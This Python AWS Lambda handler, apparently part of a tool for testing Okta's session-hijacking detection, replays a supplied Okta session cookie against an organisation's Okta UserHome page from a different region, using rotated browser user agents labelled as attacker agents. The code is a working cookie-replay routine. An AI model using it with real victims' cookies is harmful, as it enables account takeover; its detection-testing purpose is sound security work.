"""
Lambda handler for ITP session cookie replay.

Replays an Okta session cookie from this Lambda's region, which will have a
different IP and geographic context from the victim's session, triggering
Okta's session hijacking detection.

This file is deployed as a Lambda function and uses only stdlib (no layers needed).
"""

import json
import urllib.request
import urllib.error


ATTACKER_USER_AGENTS = [
    (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/121.0.0.0 Safari/537.36"
    ),
    (
        "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) "
        "Gecko/20100101 Firefox/122.0"
    ),
    (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
    ),
]


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def handler(event, context):
    """
    Lambda handler for cross-region cookie replay.

    Event:
        {
            "cookie_name": "idx",
            "cookie": "COOKIE_VALUE",
            "okta_domain": "myorg.okta.com",
            "user_agent_index": 0
        }

    Returns:
        {
            "status": "success",
            "http_code": 200,
            "lambda_region": "eu-west-1",
            "lambda_request_id": "..."
        }
    """
    cookie_name = event.get("cookie_name", "idx")
    cookie_value = event.get("cookie")
    okta_domain = event.get("okta_domain")
    ua_index = event.get("user_agent_index", 0)

    if not cookie_value or not okta_domain:
        return {
            "status": "error",
            "error": "cookie and okta_domain are required"
        }

    url = f"https://{okta_domain}/app/UserHome"
    ua = ATTACKER_USER_AGENTS[ua_index % len(ATTACKER_USER_AGENTS)]

    print(f"Replaying {cookie_name} cookie against {okta_domain}")
    print(f"User-Agent: {ua[:60]}...")

    try:
        req = urllib.request.Request(url)
        req.add_header("User-Agent", ua)
        req.add_header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
        req.add_header("Accept-Language", "en-US,en;q=0.5")
        req.add_header("Cookie", f"{cookie_name}={cookie_value}")

        opener = urllib.request.build_opener(NoRedirect)

        try:
            response = opener.open(req, timeout=15)
            http_code = response.getcode()
            redirect_url = ""
        except urllib.error.HTTPError as e:
            http_code = e.code
            redirect_url = e.headers.get("Location", "")

        result = {
            "status": "success",
            "http_code": http_code,
            "redirect_url": redirect_url,
        }

        # Add Lambda context
        if context:
            result["lambda_region"] = context.invoked_function_arn.split(":")[3]
            result["lambda_request_id"] = context.aws_request_id

        print(f"Result: HTTP {http_code}")
        return result

    except Exception as e:
        return {
            "status": "error",
            "error": str(e),
            "lambda_region": context.invoked_function_arn.split(":")[3] if context else "unknown",
        }
